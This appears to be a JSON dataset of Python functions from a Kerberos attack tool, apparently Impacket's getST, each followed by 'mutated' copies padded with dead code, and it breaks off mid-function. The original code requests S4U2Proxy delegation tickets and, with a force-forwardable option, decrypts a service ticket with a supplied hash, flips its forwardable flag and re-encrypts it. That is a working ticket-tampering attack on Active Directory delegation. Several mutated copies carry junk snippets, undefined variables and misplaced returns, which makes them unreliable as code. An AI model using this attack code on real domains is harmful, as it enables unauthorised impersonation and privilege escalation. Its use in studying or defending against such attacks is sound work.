[
    {
        "func_name": "__init__",
        "original": "def __init__(self, target, password, domain, options):\n    self.__password = password\n    self.__user = target\n    self.__domain = domain\n    self.__lmhash = ''\n    self.__nthash = ''\n    self.__aesKey = options.aesKey\n    self.__options = options\n    self.__kdcHost = options.dc_ip\n    self.__force_forwardable = options.force_forwardable\n    self.__additional_ticket = options.additional_ticket\n    self.__saveFileName = None\n    if options.hashes is not None:\n        (self.__lmhash, self.__nthash) = options.hashes.split(':')",
        "mutated": [
            "def __init__(self, target, password, domain, options):\n    if False:\n        i = 10\n    self.__password = password\n    self.__user = target\n    self.__domain = domain\n    self.__lmhash = ''\n    self.__nthash = ''\n    self.__aesKey = options.aesKey\n    self.__options = options\n    self.__kdcHost = options.dc_ip\n    self.__force_forwardable = options.force_forwardable\n    self.__additional_ticket = options.additional_ticket\n    self.__saveFileName = None\n    if options.hashes is not None:\n        (self.__lmhash, self.__nthash) = options.hashes.split(':')",
            "def __init__(self, target, password, domain, options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.__password = password\n    self.__user = target\n    self.__domain = domain\n    self.__lmhash = ''\n    self.__nthash = ''\n    self.__aesKey = options.aesKey\n    self.__options = options\n    self.__kdcHost = options.dc_ip\n    self.__force_forwardable = options.force_forwardable\n    self.__additional_ticket = options.additional_ticket\n    self.__saveFileName = None\n    if options.hashes is not None:\n        (self.__lmhash, self.__nthash) = options.hashes.split(':')",
            "def __init__(self, target, password, domain, options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.__password = password\n    self.__user = target\n    self.__domain = domain\n    self.__lmhash = ''\n    self.__nthash = ''\n    self.__aesKey = options.aesKey\n    self.__options = options\n    self.__kdcHost = options.dc_ip\n    self.__force_forwardable = options.force_forwardable\n    self.__additional_ticket = options.additional_ticket\n    self.__saveFileName = None\n    if options.hashes is not None:\n        (self.__lmhash, self.__nthash) = options.hashes.split(':')",
            "def __init__(self, target, password, domain, options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.__password = password\n    self.__user = target\n    self.__domain = domain\n    self.__lmhash = ''\n    self.__nthash = ''\n    self.__aesKey = options.aesKey\n    self.__options = options\n    self.__kdcHost = options.dc_ip\n    self.__force_forwardable = options.force_forwardable\n    self.__additional_ticket = options.additional_ticket\n    self.__saveFileName = None\n    if options.hashes is not None:\n        (self.__lmhash, self.__nthash) = options.hashes.split(':')",
            "def __init__(self, target, password, domain, options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.__password = password\n    self.__user = target\n    self.__domain = domain\n    self.__lmhash = ''\n    self.__nthash = ''\n    self.__aesKey = options.aesKey\n    self.__options = options\n    self.__kdcHost = options.dc_ip\n    self.__force_forwardable = options.force_forwardable\n    self.__additional_ticket = options.additional_ticket\n    self.__saveFileName = None\n    if options.hashes is not None:\n        (self.__lmhash, self.__nthash) = options.hashes.split(':')"
        ]
    },
    {
        "func_name": "saveTicket",
        "original": "def saveTicket(self, ticket, sessionKey):\n    logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))\n    ccache = CCache()\n    ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__saveFileName + '.ccache')",
        "mutated": [
            "def saveTicket(self, ticket, sessionKey):\n    if False:\n        i = 10\n    logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))\n    ccache = CCache()\n    ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__saveFileName + '.ccache')",
            "def saveTicket(self, ticket, sessionKey):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))\n    ccache = CCache()\n    ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__saveFileName + '.ccache')",
            "def saveTicket(self, ticket, sessionKey):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))\n    ccache = CCache()\n    ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__saveFileName + '.ccache')",
            "def saveTicket(self, ticket, sessionKey):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))\n    ccache = CCache()\n    ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__saveFileName + '.ccache')",
            "def saveTicket(self, ticket, sessionKey):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    logging.info('Saving ticket in %s' % (self.__saveFileName + '.ccache'))\n    ccache = CCache()\n    ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__saveFileName + '.ccache')"
        ]
    },
    {
        "func_name": "doS4U2ProxyWithAdditionalTicket",
        "original": "def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):\n    if not os.path.isfile(additional_ticket_path):\n        logging.error(\"Ticket %s doesn't exist\" % additional_ticket_path)\n        exit(0)\n    else:\n        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        logging.info('\\tUsing additional ticket %s instead of S4U2Self' % additional_ticket_path)\n        ccache = CCache.loadFile(additional_ticket_path)\n        principal = ccache.credentials[0].header['server'].prettyPrint()\n        creds = ccache.getCredential(principal.decode())\n        TGS = creds.toTGS(principal)\n        tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]\n        if logging.getLogger().level == logging.DEBUG:\n            logging.debug('TGS_REP')\n            print(tgs.prettyPrint())\n        if self.__force_forwardable:\n            if isinstance(nthash, str):\n                try:\n                    nthash = unhexlify(nthash)\n                except TypeError:\n                    pass\n            if isinstance(aesKey, str):\n                try:\n                    aesKey = unhexlify(aesKey)\n                except TypeError:\n                    pass\n            if self.__password != '' and self.__domain != '' and (self.__user != ''):\n                if not nthash:\n                    nthash = compute_nthash(self.__password)\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('NTHash')\n                        print(hexlify(nthash).decode())\n                if not aesKey:\n                    salt = self.__domain.upper() + self.__user\n                    aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('AESKey')\n                        print(hexlify(aesKey).decode())\n            cipherText = tgs['ticket']['enc-part']['cipher']\n            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n            if newCipher.enctype == Enctype.RC4:\n                key = Key(newCipher.enctype, nthash)\n            else:\n                key = Key(newCipher.enctype, aesKey)\n            plainText = newCipher.decrypt(key, 2, cipherText)\n            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n            logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            logging.info('\\tForcing the service ticket to be forwardable')\n            flagBits = encTicketPart['flags'].asBinary()\n            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n            logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            encodedEncTicketPart = encoder.encode(encTicketPart)\n            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n            tgs['ticket']['enc-part']['cipher'] = cipherText\n        ticketTGT = Ticket()\n        ticketTGT.from_asn1(decodedTGT['ticket'])\n        ticket = Ticket()\n        ticket.from_asn1(tgs['ticket'])\n        apReq = AP_REQ()\n        apReq['pvno'] = 5\n        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n        opts = list()\n        apReq['ap-options'] = constants.encodeFlags(opts)\n        seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n        authenticator = Authenticator()\n        authenticator['authenticator-vno'] = 5\n        authenticator['crealm'] = str(decodedTGT['crealm'])\n        clientName = Principal()\n        clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n        seq_set(authenticator, 'cname', clientName.components_to_asn1)\n        now = datetime.datetime.utcnow()\n        authenticator['cusec'] = now.microsecond\n        authenticator['ctime'] = KerberosTime.to_asn1(now)\n        encodedAuthenticator = encoder.encode(authenticator)\n        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n        apReq['authenticator'] = noValue\n        apReq['authenticator']['etype'] = cipher.enctype\n        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n        encodedApReq = encoder.encode(apReq)\n        tgsReq = TGS_REQ()\n        tgsReq['pvno'] = 5\n        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n        tgsReq['padata'] = noValue\n        tgsReq['padata'][0] = noValue\n        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n        tgsReq['padata'][0]['padata-value'] = encodedApReq\n        paPacOptions = PA_PAC_OPTIONS()\n        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n        tgsReq['padata'][1] = noValue\n        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n        reqBody = seq_set(tgsReq, 'req-body')\n        opts = list()\n        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n        opts.append(constants.KDCOptions.canonicalize.value)\n        opts.append(constants.KDCOptions.forwardable.value)\n        opts.append(constants.KDCOptions.renewable.value)\n        reqBody['kdc-options'] = constants.encodeFlags(opts)\n        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        seq_set(reqBody, 'sname', service2.components_to_asn1)\n        reqBody['realm'] = self.__domain\n        myTicket = ticket.to_asn1(TicketAsn1())\n        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n        reqBody['till'] = KerberosTime.to_asn1(now)\n        reqBody['nonce'] = random.getrandbits(31)\n        seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n        message = encoder.encode(tgsReq)\n        logging.info('\\tRequesting S4U2Proxy')\n        r = sendReceive(message, self.__domain, kdcHost)\n        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n        cipherText = tgs['enc-part']['cipher']\n        plainText = cipher.decrypt(sessionKey, 8, cipherText)\n        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n        cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n        return (r, cipher, sessionKey, newSessionKey)",
        "mutated": [
            "def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):\n    if False:\n        i = 10\n    if not os.path.isfile(additional_ticket_path):\n        logging.error(\"Ticket %s doesn't exist\" % additional_ticket_path)\n        exit(0)\n    else:\n        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        logging.info('\\tUsing additional ticket %s instead of S4U2Self' % additional_ticket_path)\n        ccache = CCache.loadFile(additional_ticket_path)\n        principal = ccache.credentials[0].header['server'].prettyPrint()\n        creds = ccache.getCredential(principal.decode())\n        TGS = creds.toTGS(principal)\n        tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]\n        if logging.getLogger().level == logging.DEBUG:\n            logging.debug('TGS_REP')\n            print(tgs.prettyPrint())\n        if self.__force_forwardable:\n            if isinstance(nthash, str):\n                try:\n                    nthash = unhexlify(nthash)\n                except TypeError:\n                    pass\n            if isinstance(aesKey, str):\n                try:\n                    aesKey = unhexlify(aesKey)\n                except TypeError:\n                    pass\n            if self.__password != '' and self.__domain != '' and (self.__user != ''):\n                if not nthash:\n                    nthash = compute_nthash(self.__password)\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('NTHash')\n                        print(hexlify(nthash).decode())\n                if not aesKey:\n                    salt = self.__domain.upper() + self.__user\n                    aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('AESKey')\n                        print(hexlify(aesKey).decode())\n            cipherText = tgs['ticket']['enc-part']['cipher']\n            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n            if newCipher.enctype == Enctype.RC4:\n                key = Key(newCipher.enctype, nthash)\n            else:\n                key = Key(newCipher.enctype, aesKey)\n            plainText = newCipher.decrypt(key, 2, cipherText)\n            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n            logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            logging.info('\\tForcing the service ticket to be forwardable')\n            flagBits = encTicketPart['flags'].asBinary()\n            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n            logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            encodedEncTicketPart = encoder.encode(encTicketPart)\n            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n            tgs['ticket']['enc-part']['cipher'] = cipherText\n        ticketTGT = Ticket()\n        ticketTGT.from_asn1(decodedTGT['ticket'])\n        ticket = Ticket()\n        ticket.from_asn1(tgs['ticket'])\n        apReq = AP_REQ()\n        apReq['pvno'] = 5\n        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n        opts = list()\n        apReq['ap-options'] = constants.encodeFlags(opts)\n        seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n        authenticator = Authenticator()\n        authenticator['authenticator-vno'] = 5\n        authenticator['crealm'] = str(decodedTGT['crealm'])\n        clientName = Principal()\n        clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n        seq_set(authenticator, 'cname', clientName.components_to_asn1)\n        now = datetime.datetime.utcnow()\n        authenticator['cusec'] = now.microsecond\n        authenticator['ctime'] = KerberosTime.to_asn1(now)\n        encodedAuthenticator = encoder.encode(authenticator)\n        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n        apReq['authenticator'] = noValue\n        apReq['authenticator']['etype'] = cipher.enctype\n        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n        encodedApReq = encoder.encode(apReq)\n        tgsReq = TGS_REQ()\n        tgsReq['pvno'] = 5\n        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n        tgsReq['padata'] = noValue\n        tgsReq['padata'][0] = noValue\n        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n        tgsReq['padata'][0]['padata-value'] = encodedApReq\n        paPacOptions = PA_PAC_OPTIONS()\n        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n        tgsReq['padata'][1] = noValue\n        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n        reqBody = seq_set(tgsReq, 'req-body')\n        opts = list()\n        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n        opts.append(constants.KDCOptions.canonicalize.value)\n        opts.append(constants.KDCOptions.forwardable.value)\n        opts.append(constants.KDCOptions.renewable.value)\n        reqBody['kdc-options'] = constants.encodeFlags(opts)\n        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        seq_set(reqBody, 'sname', service2.components_to_asn1)\n        reqBody['realm'] = self.__domain\n        myTicket = ticket.to_asn1(TicketAsn1())\n        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n        reqBody['till'] = KerberosTime.to_asn1(now)\n        reqBody['nonce'] = random.getrandbits(31)\n        seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n        message = encoder.encode(tgsReq)\n        logging.info('\\tRequesting S4U2Proxy')\n        r = sendReceive(message, self.__domain, kdcHost)\n        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n        cipherText = tgs['enc-part']['cipher']\n        plainText = cipher.decrypt(sessionKey, 8, cipherText)\n        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n        cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n        return (r, cipher, sessionKey, newSessionKey)",
            "def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if not os.path.isfile(additional_ticket_path):\n        logging.error(\"Ticket %s doesn't exist\" % additional_ticket_path)\n        exit(0)\n    else:\n        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        logging.info('\\tUsing additional ticket %s instead of S4U2Self' % additional_ticket_path)\n        ccache = CCache.loadFile(additional_ticket_path)\n        principal = ccache.credentials[0].header['server'].prettyPrint()\n        creds = ccache.getCredential(principal.decode())\n        TGS = creds.toTGS(principal)\n        tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]\n        if logging.getLogger().level == logging.DEBUG:\n            logging.debug('TGS_REP')\n            print(tgs.prettyPrint())\n        if self.__force_forwardable:\n            if isinstance(nthash, str):\n                try:\n                    nthash = unhexlify(nthash)\n                except TypeError:\n                    pass\n            if isinstance(aesKey, str):\n                try:\n                    aesKey = unhexlify(aesKey)\n                except TypeError:\n                    pass\n            if self.__password != '' and self.__domain != '' and (self.__user != ''):\n                if not nthash:\n                    nthash = compute_nthash(self.__password)\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('NTHash')\n                        print(hexlify(nthash).decode())\n                if not aesKey:\n                    salt = self.__domain.upper() + self.__user\n                    aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('AESKey')\n                        print(hexlify(aesKey).decode())\n            cipherText = tgs['ticket']['enc-part']['cipher']\n            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n            if newCipher.enctype == Enctype.RC4:\n                key = Key(newCipher.enctype, nthash)\n            else:\n                key = Key(newCipher.enctype, aesKey)\n            plainText = newCipher.decrypt(key, 2, cipherText)\n            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n            logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            logging.info('\\tForcing the service ticket to be forwardable')\n            flagBits = encTicketPart['flags'].asBinary()\n            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n            logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            encodedEncTicketPart = encoder.encode(encTicketPart)\n            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n            tgs['ticket']['enc-part']['cipher'] = cipherText\n        ticketTGT = Ticket()\n        ticketTGT.from_asn1(decodedTGT['ticket'])\n        ticket = Ticket()\n        ticket.from_asn1(tgs['ticket'])\n        apReq = AP_REQ()\n        apReq['pvno'] = 5\n        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n        opts = list()\n        apReq['ap-options'] = constants.encodeFlags(opts)\n        seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n        authenticator = Authenticator()\n        authenticator['authenticator-vno'] = 5\n        authenticator['crealm'] = str(decodedTGT['crealm'])\n        clientName = Principal()\n        clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n        seq_set(authenticator, 'cname', clientName.components_to_asn1)\n        now = datetime.datetime.utcnow()\n        authenticator['cusec'] = now.microsecond\n        authenticator['ctime'] = KerberosTime.to_asn1(now)\n        encodedAuthenticator = encoder.encode(authenticator)\n        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n        apReq['authenticator'] = noValue\n        apReq['authenticator']['etype'] = cipher.enctype\n        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n        encodedApReq = encoder.encode(apReq)\n        tgsReq = TGS_REQ()\n        tgsReq['pvno'] = 5\n        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)\n        tgsReq['padata'] = noValue\n        tgsReq['padata'][0] = noValue\n        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)\n        tgsReq['padata'][0]['padata-value'] = encodedApReq\n        paPacOptions = PA_PAC_OPTIONS()\n        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))\n        tgsReq['padata'][1] = noValue\n        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value\n        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)\n        reqBody = seq_set(tgsReq, 'req-body')\n        opts = list()\n        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)\n        opts.append(constants.KDCOptions.canonicalize.value)\n        opts.append(constants.KDCOptions.forwardable.value)\n        opts.append(constants.KDCOptions.renewable.value)\n        reqBody['kdc-options'] = constants.encodeFlags(opts)\n        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)\n        seq_set(reqBody, 'sname', service2.components_to_asn1)\n        reqBody['realm'] = self.__domain\n        myTicket = ticket.to_asn1(TicketAsn1())\n        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))\n        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n        reqBody['till'] = KerberosTime.to_asn1(now)\n        reqBody['nonce'] = random.getrandbits(31)\n        seq_set_iter(reqBody, 'etype', (int(constants.EncryptionTypes.rc4_hmac.value), int(constants.EncryptionTypes.des3_cbc_sha1_kd.value), int(constants.EncryptionTypes.des_cbc_md5.value), int(cipher.enctype)))\n        message = encoder.encode(tgsReq)\n        logging.info('\\tRequesting S4U2Proxy')\n        r = sendReceive(message, self.__domain, kdcHost)\n        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]\n        cipherText = tgs['enc-part']['cipher']\n        plainText = cipher.decrypt(sessionKey, 8, cipherText)\n        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]\n        newSessionKey = Key(encTGSRepPart['key']['keytype'], encTGSRepPart['key']['keyvalue'])\n        cipher = _enctype_table[encTGSRepPart['key']['keytype']]\n        return (r, cipher, sessionKey, newSessionKey)",
            "def doS4U2ProxyWithAdditionalTicket(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost, additional_ticket_path):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if not os.path.isfile(additional_ticket_path):\n        logging.error(\"Ticket %s doesn't exist\" % additional_ticket_path)\n        exit(0)\n    else:\n        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]\n        logging.info('\\tUsing additional ticket %s instead of S4U2Self' % additional_ticket_path)\n        ccache = CCache.loadFile(additional_ticket_path)\n        principal = ccache.credentials[0].header['server'].prettyPrint()\n        creds = ccache.getCredential(principal.decode())\n        TGS = creds.toTGS(principal)\n        tgs = decoder.decode(TGS['KDC_REP'], asn1Spec=TGS_REP())[0]\n        if logging.getLogger().level == logging.DEBUG:\n            logging.debug('TGS_REP')\n            print(tgs.prettyPrint())\n        if self.__force_forwardable:\n            if isinstance(nthash, str):\n                try:\n                    nthash = unhexlify(nthash)\n                except TypeError:\n                    pass\n            if isinstance(aesKey, str):\n                try:\n                    aesKey = unhexlify(aesKey)\n                except TypeError:\n                    pass\n            if self.__password != '' and self.__domain != '' and (self.__user != ''):\n                if not nthash:\n                    nthash = compute_nthash(self.__password)\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('NTHash')\n                        print(hexlify(nthash).decode())\n                if not aesKey:\n                    salt = self.__domain.upper() + self.__user\n                    aesKey = _AES256CTS.string_to_key(self.__password, salt, params=None).contents\n                    if logging.getLogger().level == logging.DEBUG:\n                        logging.debug('AESKey')\n                        print(hexlify(aesKey).decode())\n            cipherText = tgs['ticket']['enc-part']['cipher']\n            newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]\n            if newCipher.enctype == Enctype.RC4:\n                key = Key(newCipher.enctype, nthash)\n            else:\n                key = Key(newCipher.enctype, aesKey)\n            plainText = newCipher.decrypt(key, 2, cipherText)\n            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]\n            logging.debug('\\tService ticket from S4U2self flags: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket from S4U2self is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            logging.info('\\tForcing the service ticket to be forwardable')\n            flagBits = encTicketPart['flags'].asBinary()\n            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]\n            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)\n            logging.debug('\\tService ticket flags after modification: ' + str(encTicketPart['flags']))\n            logging.debug('\\tService ticket now is' + ('' if encTicketPart['flags'][TicketFlags.forwardable.value] == 1 else ' not') + ' forwardable')\n            encodedEncTicketPart = encoder.encode(encTicketPart)\n            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)\n            tgs['ticket']['enc-part']['cipher'] = cipherText\n        ticketTGT = Ticket()\n        ticketTGT.from_asn1(decodedTGT['ticket'])\n        ticket = Ticket()\n        ticket.from_asn1(tgs['ticket'])\n        apReq = AP_REQ()\n        apReq['pvno'] = 5\n        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)\n        opts = list()\n        apReq['ap-options'] = constants.encodeFlags(opts)\n        seq_set(apReq, 'ticket', ticketTGT.to_asn1)\n        authenticator = Authenticator()\n        authenticator['authenticator-vno'] = 5\n        authenticator['crealm'] = str(decodedTGT['crealm'])\n        clientName = Principal()\n        clientName.from_asn1(decodedTGT, 'crealm', 'cname')\n        seq_set(authenticator, 'cname', clientName.components_to_asn1)\n        now = datetime.datetime.utcnow()\n        authenticator['cusec'] = now.microsecond\n        authenticator['ctime'] = KerberosTime.to_asn1(now)\n        encodedAuthenticator = encoder.encode(authenticator)\n        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)\n        apReq['authenticator'] = noValue\n        apReq['authenticator']['etype'] = cipher.enctype\n        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator\n        encodedApReq = 